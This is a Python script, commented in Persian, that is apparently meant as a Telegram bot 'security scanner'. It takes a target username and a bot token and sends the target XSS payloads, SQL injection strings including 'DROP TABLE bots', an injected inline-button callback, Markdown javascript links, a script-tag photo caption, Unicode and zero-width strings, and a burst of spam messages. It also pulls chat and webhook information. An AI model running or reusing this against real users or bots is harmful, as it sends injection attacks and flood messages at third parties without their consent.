import requests, time, json

def run_scan(target_username, bot_token):
    base_url = f"https://api.telegram.org/bot{bot_token}"
    results = []
    def log(test, status, details="—"):
        results.append({"test": test, "status": status, "details": details})

    # ⚡ 1. بررسی اطلاعات اولیه
    try:
        info = requests.get(f"{base_url}/getChat?chat_id=@{target_username}", timeout=5).json()
        log("📍 Chat Info", "✅", info.get("result", {}))
    except Exception as e:
        log("📍 Chat Info", "❌", str(e))

    # 🔐 2. بررسی Webhook فعال
    try:
        wh = requests.get(f"{base_url}/getWebhookInfo", timeout=5).json()
        log("🔐 Webhook Analysis", "✅", wh.get("result", {}))
    except Exception as e:
        log("🔐 Webhook Analysis", "❌", str(e))

    # 💉 3. XSS Injection پیشرفته در متن
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('👀')>",
        "<svg/onload=alert(1337)>",
        "<a href='javascript:alert(`💥`)'>Click</a>"
    ]
    for payload in xss_payloads:
        try:
            r = requests.post(f"{base_url}/sendMessage", json={
                "chat_id": f"@{target_username}",
                "text": payload,
                "parse_mode": "HTML"
            }, timeout=5).json()
            log(f"💉 XSS Payload", "✅", r)
        except Exception as e:
            log("💉 XSS Payload", "❌", str(e))

    # 🧬 4. SQL Injection ترکیبی
    sql_tests = [
        "' OR 1=1; --",
        "'; DROP TABLE bots; --",
        "' /**/OR/**/1/**/=/**/1",
        "' UNION SELECT null, version(); --"
    ]
    for payload in sql_tests:
        try:
            r = requests.post(f"{base_url}/sendMessage", json={
                "chat_id": f"@{target_username}",
                "text": payload
            }, timeout=5).json()
            log(f"🧬 SQLi Payload", "✅", r)
        except Exception as e:
            log("🧬 SQLi Payload", "❌", str(e))

    # 🔁 5. تزریق در دکمه‌های Inline
    try:
        r = requests.post(f"{base_url}/sendMessage", json={
            "chat_id": f"@{target_username}",
            "text": "🧪 تست دکمه",
            "reply_markup": {
                "inline_keyboard": [[{"text": "Click", "callback_data": "<img src=x onerror=alert(1)>"}]]
            }
        }, timeout=5).json()
        log("🔁 Inline Injection", "✅", r)
    except Exception as e:
        log("🔁 Inline Injection", "❌", str(e))

    # 🧲 6. تست ورودی‌های عجیب مثل Unicode و emoji
    weirds = [
        "👑" * 50,
        "\u202Ejpg",
        "⁦⁧⁨⁩​‎‌",  # zero-width chars
        "🐉" * 100
    ]
    for w in weirds:
        try:
            r = requests.post(f"{base_url}/sendMessage", json={
                "chat_id": f"@{target_username}",
                "text": w
            }, timeout=5).json()
            log("🧲 Unicode / ZW test", "✅", r)
        except Exception as e:
            log("🧲 Unicode", "❌", str(e))

    # 🎭 7. Markdown تزریقی
    try:
        r = requests.post(f"{base_url}/sendMessage", json={
            "chat_id": f"@{target_username}",
            "text": "*bold* _italic_ [XSS](javascript:alert(1))",
            "parse_mode": "MarkdownV2"
        }, timeout=5).json()
        log("🎭 Markdown Injection", "✅", r)
    except Exception as e:
        log("🎭 Markdown Injection", "❌", str(e))

    # 🖼️ 8. تزریق در کپشن فایل عکس
    try:
        r = requests.post(f"{base_url}/sendPhoto", data={
            "chat_id": f"@{target_username}",
            "caption": "<script>alert('photo')</script>"
        }, files={
            "photo": ("x.jpg", b"\xff\xd8\xff", "image/jpeg")
        }, timeout=5).json()
        log("🖼️ Caption XSS in photo", "✅", r)
    except Exception as e:
        log("🖼️ Caption XSS", "❌", str(e))

    # 📩 9. Spam/Flood Behavior Test
    try:
        for i in range(5):
            r = requests.post(f"{base_url}/sendMessage", json={
                "chat_id": f"@{target_username}",
                "text": f"Spam {i+1}"
            }, timeout=3).json()
            time.sleep(0.3)
        log("📩 Flood x5", "✅", "5 پیام ارسال شد")
    except Exception as e:
        log("📩 Flood Test", "❌", str(e))

    # 🎯 10. Fingerprint Security + Token Behavior
    try:
        r = requests.get(f"{base_url}/getMe", timeout=5).json()
        u = r.get("result", {}).get("username", "نامشخص")
        risk = "⚠️ مشکوک" if any(x in u.lower() for x in ["admin", "dev", "test", "demo"]) else "✅ ایمن"
        log("🎯 Token Fingerprint", risk, r.get("result", {}))
    except Exception as e:
        log("🎯 Token Fingerprint", "❌", str(e))

    return results